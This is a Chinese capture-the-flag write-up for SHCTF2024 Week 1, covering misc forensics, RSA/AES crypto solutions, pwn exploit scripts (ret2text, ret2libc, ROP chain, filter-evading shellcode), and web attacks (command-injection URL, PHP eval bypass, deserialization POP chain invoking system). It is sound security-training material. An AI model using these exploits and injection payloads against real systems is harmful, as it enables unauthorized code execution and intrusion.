---
title: SHCTF2024 Week1 WP
createTime: 2025/04/30 19:15:13
permalink: /cybersecurity/qsgu1th6/
---
# <font style="color:#E4495B;">M</font><font style="color:#D8DAD9;">ISC</font>
## <font style="color:#7E45E8;">签到题</font>
关注公众号发送指定消息得到 flag。

![](../../../../images/42e43758a065bb8f182eaf7c66f0f968.png)

## <font style="color:#7E45E8;">拜师之旅①</font>
拿到一张 png，010 看一下，发现文件头缺了前 8 位，手动补一下。

补好以后发现 CRC 有问题，宽高爆破一下，修好以后可以在图片底部看到 flag。

![](../../../../images/9f13b311083d1a2cfc7071057d9d3b25.png)

## <font style="color:#7E45E8;">真真假假?遮遮掩掩!</font>
拿到一个压缩包，一眼伪加密，解压出来。

里面又是一个压缩包，有密码，最后有个提示。

![](../../../../images/b015fb7d00f25adac65c25df80fdbe89.png)

一开始以为是个轴对称的密码，结果没爆出来，后面直接掩码纯数字爆破就出了，好坑😭。

![](../../../../images/43d596bcf15e636fed52d0f10a3533ed.png)

解压出来的 txt 里面就是 flag。

## <font style="color:#7E45E8;">Rasterizing Traffic</font>
拿到一个流量包，导出 http 对象看一下，看到最后有个很大的对象。

![](../../../../images/c7a20562a16ac3281643f866a4ef8020.png)

进去看一下，发现是 POST 请求传了一个 PNG 图像，直接把这个图像取出来。

![](../../../../images/e92a51669cdc1d27db2ac97354280857.png)

这是光栅图，可以拿工具 _**Raster-Terminator-1.1**_ 直接跑，但是导出的这个图像是灰度图，用这个工具会报错。

解决方法很简单，用画图工具打开这个图，然后再另存为一张就好了。

![](../../../../images/a6e5ec6328167da7c5559ac11e331134.png)

## <font style="color:#7E45E8;">有WiFi干嘛不用呢？</font>
破解 wifi 密码，拿到的文件夹 may 里面是密码字典，用 aircrack-ng 直接爆就好了。

```plain
LgJakkAe66u7Fi
7fxkZUasGnJQnqCg
Ekon86XrkWhUsfNq
ZQOeVAiDTOz7qUr4
1X2Jh57g6Xcjx#FG
w6xXtbY7YXkEQFDl
YeKA9qpcwp%38be3
fJynb$S@biT%@Zs
u7HYiYqL#i4Hf4sl
Wi8rFMEM4IufCVQs
l*zKs0CFQIomU$d
PV15j@n42^C3Xz%Z
Ck8nBqOO*ZejQ
wcg12D9uC16YGp
YKPKWeaNId7OGjlZ
QTLIpFGf1Dknf2!v
lVoNHCh9O7HEiefN
72pk1RNnbqmMDyH
YvHJyuRgkiYJwNO8
sNzrt97lz9d%#ciJ
tLfZ0nFhcsCNL#
Xjla$0%FzwPIn!Vy
oAagZSXJyP8Sm3Ln
8b@sOXI*PXdmhWj9
FxCqmDoCd5UzP6
0hkJFIaVb9brETOc
3Og2TyKxCqeo6csz
WcWE6RymUHAwN1bv
$NfbciFWXJ1TM^Z5
jcIFsJZCwuUNCGGB
uMRwYbYzM*I0isNC
igA@geaJlMtWgan@
u^buGg^u1RQ52cqa
B*1Fu0U7Ww!Zx4e6
4EbXA4HZj$T4Bc$3
kXWKthWgP8AWnGY*
Qf%xjcgSd229FApt
m*2FfKD7EMvtVvp
0TUMVxz0JrUSDxHG
pt*VRqDDU%Q6p3
MY2vAMs81ywMGQQR
ShiD8Wa1iWJbJj
b5S5EiBAmEFM9ArF
gxvZiJ3mtb44Kwdy
gxvZiJ3mtb44Kwdy
9iMLVnZq5ruMdSx
1oIfvLfexS%zIF

```

![](../../../../images/f9d9e653a9438f924a9830e3d2dae7fc.png)

## <font style="color:#7E45E8;">Quarantine</font>
拿到一个不知名的文件，结合题目描述和题目名称猜测大概是隔离区文件恢复，但是不知道是哪个杀毒软件。

找到一个 [https://remnux.org/](https://remnux.org/)，似乎能恢复大多数杀毒软件隔离区的文件。

进入仓库看一下，[distro/files at master · REMnux/distro (github.com)](https://github.com/REMnux/distro/blob/master/files/DeXRAY.pl)。

![](../../../../images/6dc721b6601c19470a8bd2f631b52159.png)

![](../../../../images/689702ec1f4f5484417493a90cfa6ff5.png)

发现符合 Microsoft Defender 隔离区文件特征，往下翻，寻找恢复方式。

![](../../../../images/16466ef4646867cbc0030f55123e70da.png)

RC4 跑一下就可以了。

![](../../../../images/fd506863d2cdfef98958881deb4ac8eb.png)

后面一串是 base64 编码后的 zip 压缩包，提出来以后发现有密码。

直接爆破无果，直接上大字典，爆出来了。

![](../../../../images/d2b35a9f4de8a8db58f82cf08f64d6d6.png)

解压后就是 flag 的截图。

# <font style="color:#DF2A3F;">C</font><font style="color:#D8DAD9;">rypto</font>
## <font style="color:#7E45E8;">Hello Crypto</font>
```python
from Crypto.Util.number import bytes_to_long
from secret import flag

m = bytes_to_long(flag)
print("m =",m)

# In cryptography, m stands for message, also plaintext
# so, why this m is number?
# decrypt this Message to get flag!
# m = 215055650564999508003664320029948849876761670821463073139507989253502762981585450551577835633263036021652467769726209177469

```

直接给了 m，long_to_bytes 回去即可。

```python
from Crypto.Util.number import *
m = 215055650564999508003664320029948849876761670821463073139507989253502762981585450551577835633263036021652467769726209177469
print(long_to_bytes(m))
#b'SHCTF{hEI1o_CTf3R_w3lc0ME_tO_cRYPTO_WORld_c2EOCA17}'

```

## <font style="color:#7E45E8;">EzAES</font>
```python
from Crypto.Cipher import AES
import os

iv = os.urandom(16)
key = os.urandom(16)
my_aes = AES.new(key, AES.MODE_CBC, iv)
flag = open('flag.txt', 'rb').read()
flag += (16 - len(flag) % 16) * b' '
c = my_aes.encrypt(flag)
print(c)
print(iv)
print(key)
'''
b'\x9e\xb76m\x17\xe2O8\x01V\xf5\xe0\x10\xb7\xf1\x0by\xb5B\x9d\xf9d F\xb3t{\xacH\xf7\xce\x0b\xf3\xe7\xa0\x96\xd3\xa4\\\xbd\xc5\x0bs\xcd\x0c\xc6C\x17'
b'\xaf\x8d\x1f\x92\x9d\x9f^~\xff\xd0\x14<\xe20\xab6'
b'6(\xbfW+c\xfe\xe7\xd5\xc2?\x1c\x03\xc1\x84{'

```

简单 AES，密文密钥偏移量全给了，直接丢 AI 跑一个脚本。

```python
from Crypto.Cipher import AES
import os

# 假设你已经有了IV、密钥和密文
iv = b'\xaf\x8d\x1f\x92\x9d\x9f^~\xff\xd0\x14<\xe20\xab6'
key = b'6(\xbfW+c\xfe\xe7\xd5\xc2?\x1c\x03\xc1\x84{'
ciphertext = b'\x9e\xb76m\x17\xe2O8\x01V\xf5\xe0\x10\xb7\xf1\x0by\xb5B\x9d\xf9d F\xb3t{\xacH\xf7\xce\x0b\xf3\xe7\xa0\x96\xd3\xa4\\\xbd\xc5\x0bs\xcd\x0c\xc6C\x17'

# 创建解密对象
my_aes = AES.new(key, AES.MODE_CBC, iv)

# 解密
try:
    decrypted = my_aes.decrypt(ciphertext)
    print(decrypted)
except ValueError as e:
    print("解密失败:", e)
#b'SHCTF{8baa1237-e50e-4e69-b523-bde04cd7dcd6}\x00\x00\x00\x00\x00'

```

## <font style="color:#7E45E8;">factor</font>
```python
from Crypto.Util.number import *
import random
from enc import flag

m = bytes_to_long(flag)
e = 65537
def prod(iterable):
    result = 1
    for num in iterable:
        result *= num
    return result
prime_list = [getPrime(64) for _ in  range(10) ]
N = prod(prime_list)
p_list = random.sample(prime_list,7)
n = prod(p_list)
c = pow(m,e,n)
print(f"c = {c}")
print(f"N = {N}")
'''
c = 68629152898722507001107419906443419901065529748731996788687363020701879829729561131367608588788851394701315734716980237382885845700151
N = 236186338388101619340399758564587568051056301122485801560266126027346672198019752322226531887156239199979521951512270872596400146793391081711224808279483677778658622992449714802456740422551131
'''
    
```

yafu 可以把这 10 个素数分出来，然后直接 dfs 搜这个 n，10 选 7。

```python
import libnum
c = 68629152898722507001107419906443419901065529748731996788687363020701879829729561131367608588788851394701315734716980237382885845700151
N = 236186338388101619340399758564587568051056301122485801560266126027346672198019752322226531887156239199979521951512270872596400146793391081711224808279483677778658622992449714802456740422551131
e = 65537
p = [11302093393935860839,11612939404248099397,11618892200719653181,11901592396698452341,14280880653872979439,14824977662169374143,15082259430530948947,15459458766410811499,16236126667225719871,16236475682254892567]
def dfs(pos,cnt,phi,n):
    if pos==10:
        if cnt!=7:
            return
        else:
            d = libnum.invmod(e,phi)
            m = pow(c,d,n)
            flag = libnum.n2s(m)
            if b'SHCTF' in flag:
                print(flag)
                return
            return
    dfs(pos+1,cnt+1,phi*(p[pos]-1),n*p[pos])
    dfs(pos+1,cnt,phi,n)
dfs(0,0,1,1)
#b'SHCTF{5fe63e98-7526-4e80-a6c5-8328f7529004}'

```

## <font style="color:#7E45E8;">baby_mod</font>
```python
from Crypto.Util.number import *
from enc import flag

m = bytes_to_long(flag)
p = getPrime(512)
q = getPrime(512)
r = getPrime(777)
t = getPrime(777)
tmp = getPrime(15)
e = 65537
n = p*q
print(f"c = {pow(m,e,n)}")
print(f"leak = {p*r-q*t-tmp}")
print(f"r = {r}")
print(f"t = {t}")
'''
c = 26365875621344526661451914441526663221789159925189006789887420886723112579364729442550294802102593262202006414119367504862247736237351584106365107681117977279510804614312690356731798239205845223046263541082951625768503322866122498850617720808109108724604097011181989953810573763959227597149403796348568621472
leak = 443573140592716014066268717722917998421797691779036792316197296616741519165067306554286434780789691764305645683870127711551301746720240783798318394274143732026250848108979931400092871955262142408509184204123514882183824444034708121958375648201207278220610777369365333244370349966702945919864591116862642643141364881144279235147746748862666037891706618286798663892749572481959278436424001
r = 597343969135125976729518636455811612323200259238588787378107207280306141307123323772931665170324868604752013846546146171075578264586830524119959067431969572186897662835773091571112322865567977869391591218865755137764614691016879498331
t = 549685204621221892894990730638928787831069287658256375510235869115982579164064230281881765426320431172982271839375709730117886723524635511995601470559142455441044246163597431124988669725290332613705085949781233910753653056901452286527
'''

```

![image](../../../../images/9209f201d2f6e01e381789a66dc5643d.svg)

tmp 不大，可以直接爆破，然后用扩展欧几里得求解素数的丢番图方程即可，注意一下解的正负即可。

```python
from Crypto.Util.number import *
from tqdm import tqdm
from sympy import *
import math
import libnum


def extended_gcd(a, b):
    if b == 0:
        return (a, 1, 0)
    else:
        g, x, y = extended_gcd(b, a % b)
        return (g, y, x - (a // b) * y)


def solve_diophantine_prime(a, b, c):
    # Find the modular inverse of a modulo b (since a and b are coprime)
    def mod_inverse(x, m):
        # Using Fermat's little theorem for modular inverse since m is prime
        return pow(x, m - 2, m)

    # Compute the modular inverse of a modulo b
    a_inv = mod_inverse(a, b)

    # Compute the solution for x and y
    x = (c * a_inv) % b
    y = ((c - a * x) // b)

    if isprime(x) and isprime(-y):
        return (x, y)
    else:
        return None

e = 65537
c = 26365875621344526661451914441526663221789159925189006789887420886723112579364729442550294802102593262202006414119367504862247736237351584106365107681117977279510804614312690356731798239205845223046263541082951625768503322866122498850617720808109108724604097011181989953810573763959227597149403796348568621472
leak = 443573140592716014066268717722917998421797691779036792316197296616741519165067306554286434780789691764305645683870127711551301746720240783798318394274143732026250848108979931400092871955262142408509184204123514882183824444034708121958375648201207278220610777369365333244370349966702945919864591116862642643141364881144279235147746748862666037891706618286798663892749572481959278436424001
r = 597343969135125976729518636455811612323200259238588787378107207280306141307123323772931665170324868604752013846546146171075578264586830524119959067431969572186897662835773091571112322865567977869391591218865755137764614691016879498331
t = 549685204621221892894990730638928787831069287658256375510235869115982579164064230281881765426320431172982271839375709730117886723524635511995601470559142455441044246163597431124988669725290332613705085949781233910753653056901452286527

for i in tqdm(range(2**15)):
    solution = solve_diophantine_prime(r, t, leak+i)
    if solution:
        x, y = solution
        print(f"Positive integer solution: x = {x}, y = {y}")
        phi = (x-1)*(-y-1)
        n = x*(-y)
        d = libnum.invmod(e,phi)
        m = pow(c,d,n)
        print(libnum.n2s(m))
        
```

![](../../../../images/e36e00ff481f163afd9a335a2c20f96a.png)

## <font style="color:#7E45E8;">d_known</font>
```python
from Crypto.Util.number import *
from gmpy2 import*
from flag import flag

m = bytes_to_long(flag)
p = getPrime(1024)
q = next_prime(p)
n = p * q
e = 0x10001
d = inverse(e, (p-1) * (q-1))
c = pow(m, e, n)
print(c)
print(d)

'''
c = 8968430282892496100021389969685538848104596094879239989597738454719202041065697003497201559973320223772292554894155850505792652918674365187947542766609084962997467684166684138300267904002086525648326938128063777892812689585827480466593062897462894172755353292217600804744183625864809532746956754567505827609530978716656601898884199201165631025638473772726660082809306537558139169123357697266774837198734507370131812463803495918822128244228994311066226134619438530842725359010836218600459202971922510440610099430664577645286784716235465083837461302972353382836962317623425356370261943893964799012956243877962532248404
d = 4584451063261893287987834734235751287863712026191804316340296664723477849164655984810559630291054251451001997081379767074198968955763186617384098153520211895276859425322191998146470268841474998391830431583274349365724826726903913915984440949077859818875704088880365350931772779006707964637490323791648100917890053647288604279325906942935325263682072530340566192660214420365108229004752156968686316678748481784121262822613014451308375849060366379429114399332649800042055018259897594521421545009653710626107001212510994757110792625570422223436347196964607464676289298852888874735428131941041339139450978852461179471017
'''

```

只给了 c，d，还要注意这里 p，q很接近，在 ![image](../../../../images/46510cd986416a4960f5d4acb4d682d7.svg) 附近。

根据 ![image](../../../../images/72a32b70e56060a55d3b6a2d63964a30.svg)，可以得到 ![image](../../../../images/70f6d22280aa0856b4957809c68080ae.svg)，其中 ![image](../../../../images/441ad917bb33a48407b59a8bdbcacf97.svg)

可以直接爆破 k，得到一个 phi，根据之前的结论，可以得知 p，q 也在 ![image](../../../../images/41dc89c4b778c33c3635b12efcdd02e4.svg) 附近，这里需要手动试一下范围，稍微移动一下就出了。

```python
import libnum
from sympy import isprime, nextprime, prevprime

e = 0x10001
c = 8968430282892496100021389969685538848104596094879239989597738454719202041065697003497201559973320223772292554894155850505792652918674365187947542766609084962997467684166684138300267904002086525648326938128063777892812689585827480466593062897462894172755353292217600804744183625864809532746956754567505827609530978716656601898884199201165631025638473772726660082809306537558139169123357697266774837198734507370131812463803495918822128244228994311066226134619438530842725359010836218600459202971922510440610099430664577645286784716235465083837461302972353382836962317623425356370261943893964799012956243877962532248404
d = 4584451063261893287987834734235751287863712026191804316340296664723477849164655984810559630291054251451001997081379767074198968955763186617384098153520211895276859425322191998146470268841474998391830431583274349365724826726903913915984440949077859818875704088880365350931772779006707964637490323791648100917890053647288604279325906942935325263682072530340566192660214420365108229004752156968686316678748481784121262822613014451308375849060366379429114399332649800042055018259897594521421545009653710626107001212510994757110792625570422223436347196964607464676289298852888874735428131941041339139450978852461179471017
for k in range(1,e):
    if (e * d - 1) % k != 0: continue
    tphi = (e * d - 1) // k
    if len(bin(tphi))-2 != 2047: continue
    print(tphi)
    p = libnum.nroot(tphi,2)
    if isprime(p)==False:
        p = prevprime(p)
    q = nextprime(p)
    if (p-1)*(q-1)==tphi:
        n = p*q
        m = pow(c,d,n)
        print(libnum.n2s(m))
#b'SHCTF{0e3b8d7f-83df-40d8-8274-6503a19c9c2c}'

```



# <font style="color:#DF2A3F;">P</font><font style="color:#D8DAD9;">wn</font>
## <font style="color:#7E45E8;">签个到吧</font>
ida 看一眼，发现 ban 了一些指令，可以用通配符绕过，得到 shell。

`/bin/s?`

然后发现 cat，ls 都会出错，应该是重定向的问题，稍微试一下，输出到文件描述符 2 就好了。

![](../../../../images/eccb4b459254e216b63ab34f60f027ac.png)

## <font style="color:#7E45E8;">No stack overflow1</font>
![](../../../../images/69178a77e8a62c8229eaad524d25abda.png)

有个检测输入长度的东西，可以用 \x00 截断绕过，然后栈溢出。

![](../../../../images/10b55e8e6d7f971611f72bf7736ed861.png)

同时发现后面函数，直接打 ret2text。

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
io = remote("entry.shc.tf",xxxxx)
sh = 0x4011D6
ret = 0x4011F4
payload = b'\x00'+b'A'*271 + b'B'*8 + p64(ret) + p64(sh)
io.sendline(payload)
io.interactive()

```

## <font style="color:#7E45E8;">No stack overflow2</font>
![](../../../../images/0f88dcb2dfe8a3d031920149229e6741.png)

先读入一个长度，然后在用 read 读指定长度的内容，由于 read 的第三个参数是 size_t 类型，可以直接传 -1 造成溢出，然后能够读很长的内容。

没有找到后门和 system，sh，还是动态链接，直接打 ret2libc，这题 LibcSearcher 不太靠谱，得手动去试版本。

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
context.log_level = "debug"
#context.arch = 'amd64'
elf=ELF('./vuln(1)')
#p=process('./vuln(1)')
p=remote("entry.shc.tf",xxxxx)
offset = 0x100 + 8
main_addr = elf.sym['main']
ret = 0x40101a
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401223
payload_first = offset * b'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.recvuntil(b"size: \n")
p.sendline(b'-1')
p.recvuntil(b'input: \n')
p.sendline(payload_first)
real_puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(real_puts_addr))
#libc = LibcSearcher("puts", real_puts_addr)
#libc_base = real_puts_addr - libc.dump("puts")
#system_addr = libc_base + libc.dump("system")
#binsh_addr = libc_base + libc.dump("str_bin_sh")
libc = ELF('./libc.so')
libc_base = real_puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh').__next__()
print(hex(libc_base))
sleep(1)
payload_end = offset * b'a' + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.recvuntil(b'size: \n')
p.sendline(b'-1')
p.recvuntil(b'input: \n')
p.sendline(payload_end)
#p.sendline(b"ls /")
p.interactive()

```

## <font style="color:#7E45E8;">No stack overflow2 pro</font>
![](../../../../images/41975fac249376eae9a0c55ee77992fa.png)

绕过方法同上一题。

这题是静态链接，跑一下 ROPgadget，生一个 ropchain 直接就打通了......

```python
#!/usr/bin/env python
# coding=utf-8
#!/usr/bin/env python3
# execve generated by ROPgadget
from pwn import *
from struct import pack
# Padding goes here
context.log_level = 'debug'
#io = process('./vuln(2)')
io = remote("entry.shc.tf",xxxxx)
io.recvuntil(b"size: \n")
io.sendline(b'-1')
io.recvuntil(b'input: \n')
p = b'A'*256 + b'B'*8
p += pack('<Q', 0x000000000040a32e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e50e0) # @ .data
p += pack('<Q', 0x00000000004507f7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x0000000000452d55) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040a32e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e50e8) # @ .data + 8
p += pack('<Q', 0x0000000000445570) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000452d55) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004022bf) # pop rdi ; ret
p += pack('<Q', 0x00000000004e50e0) # @ .data
p += pack('<Q', 0x000000000040a32e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e50e8) # @ .data + 8
p += pack('<Q', 0x000000000049d06b) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004e50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000445570) # xor rax, rax ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000048f1b0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000402074) # syscall
io.sendline(p)
io.interactive()

```

## <font style="color:#7E45E8;">指令执行器</font>
ret2shellcode，但是过滤了 syscall，网上找个板子直接打通了。

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
#io = process('./pwn')
io = remote("entry.shc.tf",xxxxx)
io.recvuntil(b'length:')
io.sendline(b'256')
io.recvuntil(b'tion:')
shellcode = """
    /* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push b'sh\x00-p\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x702d006873
    xor [rsp], rax
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 0xb
    pop rsi
    add rsi, rsp
    push rsi /* '-p\x00' */
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push 0x3b /* 0x3b */
    pop rax
    //syscall
    push 0x050e
    inc qword ptr [rsp]
    jmp rsp
    nop
"""
#payload = asm(shellcraft.sh()).ljust(256,b'\x00')
payload = asm(shellcode).ljust(256,b'\x00')
io.send(payload)
io.interactive()

```

# <font style="color:#DF2A3F;">W</font><font style="color:#D8DAD9;">eb</font>
## <font style="color:#7E45E8;">单身十八年的手速</font>
要求点击按钮 520 次以上，直接看 js 源码，找到这个。

![](../../../../images/216575821eb79a0d8b8c56eea901b922.png)

base64 解一下就出了。

![](../../../../images/7bd572948af7dbf17e4a1634dbc7a204.png)

## <font style="color:#7E45E8;">jvav</font>
![](../../../../images/8f77ad88f169c86cdea4515d93d8e0fd.png)

直接写一个 java RCE 即可，注意类的名称是 demo，需要和文件名一致，不然编译不过。

```java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class demo {

    public static void main(String[] args) throws IOException {
        Process p = Runtime.getRuntime().exec("cat /flag");
        InputStream is=p.getInputStream();
        InputStreamReader isr=new InputStreamReader(is);
        BufferedReader br=new BufferedReader(isr);
        String line=null;
        while((line=br.readLine())!=null)
        {
            System.out.println(line);
        }
    }
}

```

## <font style="color:#7E45E8;">ez_gittt</font>
ctrl + u 看一下，发现是 .git 泄露。

![](../../../../images/601a0b9a4c8e83f41ff5888d457e0e95.png)

GitHacker 跑下来，发现 COMMIT_EDITMSG 中是 Remove_flag，盲猜是和历史版本 diff。

![](../../../../images/be0463e0fbe23b104c16a51586ee902a.png)

得到 flag。

## <font style="color:#7E45E8;">1zflask</font>
题目提示 robots，直接看 /robots.txt。

![](../../../../images/7e99596473a270a078e8a6640b32b012.png)

访问 /s3recttt，得到源码。

```python
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
 
if __name__ == '__main__':
    app.run(debug=True)
    
```

/api 路由直接 RCE，得到 flag。

```plain
/api?SSHCTFF=cat /flag

```

## <font style="color:#7E45E8;">蛐蛐?蛐蛐!</font>
ctrl + u 看一下，进入 source.txt。

![](../../../../images/ffbd1e3c07081e57a6a61f1a7ff9e605.png)

```php
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("可以让fault的蛐蛐变成现实么\n");
        }
    }
    echo("蛐蛐成功第一步！\n");

}
else{
    echo("呜呜呜fault还是要出题");
}

```

一共两层，第一层直接传 114514a 即可，第二层可以利用分号隔断，执行多条代码，直接 RCE。

![](../../../../images/f1943d82b379af951ec0e077d0069bee.png)

## <font style="color:#7E45E8;">poppopop</font>
```php
<?php
class SH {

    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;

    public function flag()
    {
        ($this->p)();
    }
}
class T{

    public $n;
    public function __destruct()
    {

        SH::$Web = true;
        echo $this->n;
    }
}
class F {
    public $o;
    public function __toString()
    {
        SH::$SHCTF = true;
        $this->o->flag();
        return "其实。。。。,";
    }
}
class SHCTF {
    public $isyou;
    public $flag;
    public function __invoke()
    {
        if (SH::$Web) {

            ($this->isyou)($this->flag);
            echo "小丑竟是我自己呜呜呜~";
        } else {
            echo "小丑别看了!";
        }
    }
}
if (isset($_GET['data'])) {
    highlight_file(__FILE__);
    unserialize(base64_decode($_GET['data']));
} else {
    highlight_file(__FILE__);
    echo "小丑离我远点！！！";
}

```

简单反序列化，链子很好搓，入口是 T，最后在 SHCTF 里面调用 system(command); 即可 RCE。

```php
<?php
class SH {

    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;

    public function flag()
    {
        ($this->p)();
    }
}
class T{

    public $n;
    public function __destruct()
    {

        SH::$Web = true;
        echo $this->n;
    }
}
class F {
    public $o;
    public function __toString()
    {
        SH::$SHCTF = true;
        $this->o->flag();
        return "其实。。。。,";
    }
}
class SHCTF {
    public $isyou='system';
    public $flag='cat /flllag';
    public function __invoke()
    {
        if (SH::$Web) {

            ($this->isyou)($this->flag);
            echo "小丑竟是我自己呜呜呜~";
        } else {
            echo "小丑别看了!";
        }
    }
}
$c = new C();
$f = new F();
$shctf = new SHCTF();
$c->p = $shctf;
$f->o = $c;
$t = new T();
$t->n = $f;
echo base64_encode(serialize($t));

```

![](../../../../images/64de0669aef794516aeda0f90cd49f80.png)

## <font style="color:#7E45E8;">MD5 Master</font>
```php
<?php
highlight_file(__file__);

$master = "MD5 master!";

if(isset($_POST["master1"]) && isset($_POST["master2"])){
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){
        echo $master . "<br>";
        echo file_get_contents('/flag');
    }
}
else{
    die("master? <br>");
} 

```

md5 绕过，这个题是指定前缀构造 md5 碰撞，fastcoll 跑一个即可，然后 url 编码传入，注意有两个坑。

:::danger
不要用 hackbar，打不通

:::

:::danger
生成的 payload 记得去掉开头的指定前缀

:::

```plain
